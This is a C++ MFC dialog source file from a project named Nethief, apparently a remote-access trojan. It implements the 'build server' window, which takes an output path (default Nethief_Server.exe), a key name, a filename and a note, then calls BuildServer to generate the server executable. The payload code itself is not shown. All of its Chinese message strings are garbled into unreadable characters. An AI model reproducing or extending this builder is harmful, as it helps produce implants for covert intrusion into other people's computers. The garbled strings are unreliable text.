// ToolBarBuildServerDlg.cpp : implementation file
// Download by http://www.NewXing.com

#include "stdafx.h"
#include "Nethief.h"
#include "ToolBarBuildServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CToolBarBuildServerDlg dialog


CToolBarBuildServerDlg::CToolBarBuildServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CToolBarBuildServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CToolBarBuildServerDlg)
	m_strServerFilename = _T("");
	m_strKeyName = _T("");
	m_strFilename = _T("");
	m_strNote = _T("");
	//}}AFX_DATA_INIT
}


void CToolBarBuildServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CToolBarBuildServerDlg)
	DDX_Control(pDX, IDC_EDIT_SERVERFILENAME, m_Edit_ServerFilename);
	DDX_Text(pDX, IDC_EDIT_SERVERFILENAME, m_strServerFilename);
	DDX_Text(pDX, IDC_EDIT_KEYNAME, m_strKeyName);
	DDX_Text(pDX, IDC_EDIT_FILENAME, m_strFilename);
	DDX_Text(pDX, IDC_EDIT_NOTE, m_strNote);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CToolBarBuildServerDlg, CDialog)
	//{{AFX_MSG_MAP(CToolBarBuildServerDlg)
	ON_BN_CLICKED(IDC_BUTTON_BROWSE, OnButtonBrowse)
	ON_BN_CLICKED(IDC_BUTTON_BUILD, OnButtonBuild)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CToolBarBuildServerDlg message handlers

void CToolBarBuildServerDlg::OnButtonBrowse() 
{
	// TODO: Add your control notification handler code here
	CFileDialog dlg(FALSE,"exe","Nethief_Server.exe",
		OFN_HIDEREADONLY|OFN_CREATEPROMPT|OFN_OVERWRITEPROMPT,
		"����(*.exe)|*.exe|�����ļ�(*.*)|*.*||");
	dlg.m_ofn.lpstrTitle="����Ϊ";

	if(dlg.DoModal()==IDOK) 
	{
		m_Edit_ServerFilename.SetWindowText(dlg.GetPathName());
	}				
}

void CToolBarBuildServerDlg::OnButtonBuild() 
{
	// TODO: Add your control notification handler code here
	if(!((CNethiefApp*)AfxGetApp())->pCommunity->m_bIsRegistered)
	{
		MessageBox("���ڿͻ���������ɺ������ɷ���˳���",
			"���ɷ���˳���",MB_ICONWARNING|MB_OK);
		return;
	}
	if(MessageBox("��ȷ���������þ���ȷ������","���ɷ���˳���"
		,MB_ICONQUESTION|MB_YESNO)==IDNO)
		return;
	/////////////////////////////////////////////////////////////
	UpdateData(TRUE);

	CString strText="";
	if(m_strFilename=="")
		strText="����д���ļ�������";
	if(m_strServerFilename=="")
		strText="����д������·������";
	if(strText!="")
	{
		MessageBox(strText,"����",MB_ICONWARNING|MB_OK);
		return;
	}

	if(((CNethiefApp*)AfxGetApp())->pCommunity->BuildServer(m_strKeyName,
		m_strFilename,m_strNote,m_strServerFilename))
	{
		MessageBox("����˳���������ϡ�","���ɷ���˳���"
			,MB_ICONINFORMATION|MB_OK);
	}
	else
	{
		MessageBox("����˳�������ʧ�ܡ�","���ɷ���˳���"
			,MB_ICONSTOP|MB_OK);
	}
}
